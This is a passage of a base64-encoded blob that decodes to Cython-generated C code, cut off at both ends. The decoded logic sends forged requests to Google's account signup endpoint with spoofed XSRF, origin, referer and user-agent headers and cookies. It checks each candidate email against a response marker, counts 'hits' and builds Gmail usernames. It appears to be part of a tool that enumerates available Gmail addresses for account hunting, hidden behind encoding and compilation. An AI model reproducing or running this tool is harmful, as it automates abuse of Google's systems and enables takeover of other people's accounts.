19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ29vZ2xlX2FjY291bnRzX3hzcmYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMCwgX19weXhfTDNfZXJyb3IpXG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwXzIsIF9fcHl4X3ZfdGwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzA2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyLCBfX3B5eF90XzEwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzA3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTQpKSkge1xuICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzE0KTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNCk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE0LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTtcbiAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMwNywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIH1cbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdF8xMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzEwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RMLCBfX3B5eF92X3RsKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X3BhcmFtcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRpbnVlX2h0dHBzXzNBXzJGXzJGbWFpbF9nb29nLCBfX3B5eF92X3RsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzEyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkNfMjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzEyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfMTAsIF9fcHl4X3ZfZW1haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkMwXzJDMF8yQzFfMkNudWxsXzJDMF8yQzUxNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX3B5eF92X2RhdGEgPSBfX3B5eF90XzEwO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF82ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDMxNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMyA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xNCkpKSB7XG4gICAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTQpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF82KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE0KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyA0IDogMCldID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yfTtcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcyg0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzE0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BhcmFtcywgX19weXhfdl9wYXJhbXMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF92X2Nvb2tpZXMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfMTQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF81KTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMxNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzEwO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzIxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzIxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICBfX3B5eF90XzQgPSAoX19QeXhfUHlVbmljb2RlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nZl91YXJfMSwgX19weXhfdF8xNCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzQgPCAwKSkpIF9fUFlYX0VSUigwLCAzMjEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzQpIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0cywgX19weXhfdF8xMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzE0ID0gTlVMTDtcbiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcHBwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzIzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgICAgIGFzc2VydChfX3B5eF90XzE0KTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTQsIE5VTEx9O1xuICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMyMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfNCA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTAsIF9fcHl4X3ZfZW1haWwsIFB5X05FKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzI0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fcHl4X3RfNCkge1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF92X2VtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dtYWlsX2NvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICBfX3B5eF92X29rID0gX19weXhfdF8xMDtcbiAgICAgICAgICBfX3B5eF90XzEwID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3Zfb2s7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTB9O1xuICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMjYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIH1cbiAgICAgICAgICBpZiAoKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB8fCAoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB7XG4gICAgICAgICAgICBQeU9iamVjdCogc2VxdWVuY2UgPSBfX3B5eF90XzEwO1xuICAgICAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplICE9IDIpKSB7XG4gICAgICAgICAgICAgIGlmIChzaXplID4gMikgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoMik7XG4gICAgICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpO1xuICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMzI2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qoc2VxdWVuY2UpKSkge1xuICAgICAgICAgICAgICBfX3B5eF90XzUgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAwKTtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAxKTtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoc2VxdWVuY2UsIDApO1xuICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMjYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMSk7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzMjYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMyNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzI2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xO1xuICAgICAgICAgICAgX19weXhfdF82ID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF90XzEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzI2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzYpO1xuICAgICAgICAgICAgaW5kZXggPSAwOyBfX3B5eF90XzUgPSBfX3B5eF90XzE3KF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgZ290byBfX3B5eF9MMjJfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgaW5kZXggPSAxOyBfX3B5eF90XzE0ID0gX19weXhfdF8xNyhfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBnb3RvIF9fcHl4X0wyMl91bnBhY2tpbmdfZmFpbGVkO1xuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8xNyhfX3B5eF90XzYpLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMyNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX3B5eF90XzE3ID0gTlVMTDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgZ290byBfX3B5eF9MMjNfdW5wYWNraW5nX2RvbmU7XG4gICAgICAgICAgICBfX3B5eF9MMjJfdW5wYWNraW5nX2ZhaWxlZDo7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMO1xuICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJGaW5pc2goKSA9PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoaW5kZXgpO1xuICAgICAgICAgICAgX19QWVhfRVJSKDAsIDMyNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX3B5eF9MMjNfdW5wYWNraW5nX2RvbmU6O1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF92X3VzZXJuYW1lID0gX19weXhfdF81O1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19weXhfdl9nZyA9IF9fcHl4X3RfMTQ7XG4gICAgICAgICAgX